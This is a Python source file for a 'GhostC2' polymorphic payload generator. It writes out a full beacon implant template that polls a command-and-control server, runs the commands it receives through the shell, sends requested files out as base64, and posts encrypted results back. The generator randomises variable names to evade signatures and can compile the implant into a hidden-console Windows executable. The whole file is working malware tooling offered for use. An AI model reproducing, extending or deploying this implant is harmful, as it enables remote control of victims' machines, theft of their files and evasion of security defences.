import os
import sys
import random
import string
import subprocess
import argparse
from datetime import datetime

# === Payload Template ===
PAYLOAD_TEMPLATE = '''\
import os
import sys
import time
import socket
import json
import requests
import subprocess
import base64

# Inject absolute path to utils
sys.path.insert(0, "{abs_utils_path}")
from crypto import aes_encrypt

C2_URL = "{c2_url}"
RESULT_URL = "{result_url}"

def {beacon_func}():
    {host_var} = socket.gethostname()

    while True:
        {data_var} = {{
            "hostname": {host_var},
            "payload": "idle"
        }}

        try:
            {raw_var} = json.dumps({data_var})
            {enc_var} = aes_encrypt({raw_var})
            {res_var} = requests.post(C2_URL, data={enc_var}.encode(), timeout=5)

            if {res_var}.status_code == 200:
                {resp_var} = {res_var}.json()
                {task_var} = {resp_var}.get("tasks", [])

                for {cmd_var} in {task_var}:
                    print(f"[+] Executing: {{{cmd_var}}}")
                    if {cmd_var}.startswith("getfile "):
                        {file_path} = {cmd_var}.split(" ", 1)[1]
                        try:
                            with open({file_path}, "rb") as f:
                                {b64data} = base64.b64encode(f.read()).decode()
                            {result_var} = f"[EXFIL:{{{file_path}}}]\\n{{{b64data}}}"
                        except Exception as e:
                            {result_var} = f"[!] Failed to read file: {{e}}"
                    else:
                        try:
                            {out_var} = subprocess.check_output({cmd_var}, shell=True, stderr=subprocess.STDOUT, timeout=10)
                            {result_var} = {out_var}.decode().strip()
                        except subprocess.CalledProcessError as e:
                            {result_var} = f"[!] Command failed: {{e.output.decode().strip()}}"

                    print(f"[>] Sending result:\\n{{{result_var}}}")

                    {result_obj} = {{
                        "hostname": {host_var},
                        "command": {cmd_var},
                        "result": {result_var}
                    }}
                    {encrypted_result} = aes_encrypt(json.dumps({result_obj}))
                    requests.post(RESULT_URL, data={encrypted_result}.encode())

        except Exception as e:
            print(f"[!] Beacon failed: {{e}}")

        time.sleep(10)

if __name__ == "__main__":
    {beacon_func}()
'''

# === Helpers ===
def rand_name(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def generate_variable_names():
    return {
        'beacon_func': rand_name(),
        'host_var': rand_name(),
        'data_var': rand_name(),
        'raw_var': rand_name(),
        'enc_var': rand_name(),
        'res_var': rand_name(),
        'resp_var': rand_name(),
        'task_var': rand_name(),
        'cmd_var': rand_name(),
        'out_var': rand_name(),
        'result_var': rand_name(),
        'result_obj': rand_name(),
        'encrypted_result': rand_name(),
        'file_path': rand_name(),
        'b64data': rand_name()
    }

def generate_payload(c2_url, result_url, output_path):
    var_names = generate_variable_names()

    # Dynamically resolve full absolute path to `server/utils`
    script_dir = os.path.dirname(os.path.abspath(__file__))
    repo_root = os.path.abspath(os.path.join(script_dir, ".."))  # One level up
    abs_utils_path = os.path.join(repo_root, "utils")
    abs_utils_path = abs_utils_path.replace("\\", "\\\\")  # Windows escaping

    filled_code = PAYLOAD_TEMPLATE.format(
        c2_url=c2_url,
        result_url=result_url,
        abs_utils_path=abs_utils_path,
        **var_names
    )

    with open(output_path, 'w') as f:
        f.write(filled_code)

    print(f"[+] Polymorphic payload written to: {output_path}")

def compile_to_exe(source_path):
    print(f"[+] Compiling {source_path} to .exe...")
    build_cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--distpath", "builds",
        "--workpath", "builds/temp",
        "--specpath", "builds/temp",
        source_path
    ]
    subprocess.run(build_cmd)
    print("[+] Compilation complete.")

# === Entrypoint ===
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GhostC2 Polymorphic Payload Generator")
    parser.add_argument("--c2", default="http://localhost:8080/beacon", help="C2 beacon URL")
    parser.add_argument("--result", default="http://localhost:8080/result", help="C2 result post URL")
    parser.add_argument("--exe", action="store_true", help="Compile payload to .exe using PyInstaller")
    args = parser.parse_args()

    os.makedirs("builds", exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"ghost_payload_{timestamp}.py"
    output_path = os.path.join("builds", filename)

    generate_payload(args.c2, args.result, output_path)

    if args.exe:
        compile_to_exe(output_path)
